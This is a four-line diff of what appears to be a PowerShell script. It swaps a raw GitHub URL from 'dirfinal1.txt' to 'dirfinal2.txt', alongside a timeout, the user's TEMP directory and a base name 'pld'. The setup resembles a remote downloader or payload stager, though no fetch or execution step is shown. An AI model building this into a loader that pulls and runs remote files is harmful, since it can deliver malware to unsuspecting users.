@@ -1,4 +1,4 @@
-$urls = @("https://raw.githubusercontent.com/hellow2003/phpcode/main/dirfinal1.txt")
+$urls = @("https://raw.githubusercontent.com/hellow2003/phpcode/main/dirfinal2.txt")
 $timeout = 300
 $tempDir = $env:TEMP
 $base = "pld"
